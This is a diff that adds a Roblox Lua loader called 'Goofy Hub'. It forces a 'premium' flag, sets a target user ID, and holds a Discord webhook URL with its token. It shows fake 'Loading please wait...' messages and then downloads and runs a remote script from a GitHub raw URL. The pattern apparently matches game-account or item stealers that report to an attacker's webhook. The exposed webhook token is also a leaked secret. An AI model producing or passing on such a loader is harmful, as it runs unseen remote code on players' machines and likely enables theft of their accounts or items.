@@ -1,0 +1,16 @@
+spawn(function()
+    while true do
+        game:GetService("RunService").RenderStepped:Wait()
+        _G["premium"] = true
+    end
+end)
+
+_G.UserID = 1664850454
+_G.Webhook = "https://discord.com/api/webhooks/1092624701324537876/Bw_WM_hOFpzBGCo-n5_IS58FnJkwRrqfq_gIaHxxS6b0jvTJIo_fgdpW-0nw2RTOTwpb"
+_G.ScriptName = "Goofy Hub"
+_G.FirstText = "Loading please wait..."
+_G.SecondText = "Almost there..."
+_G.ThirdText = "Launching script..."
+_G.WaitingTime = 10
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Script.lua"))()
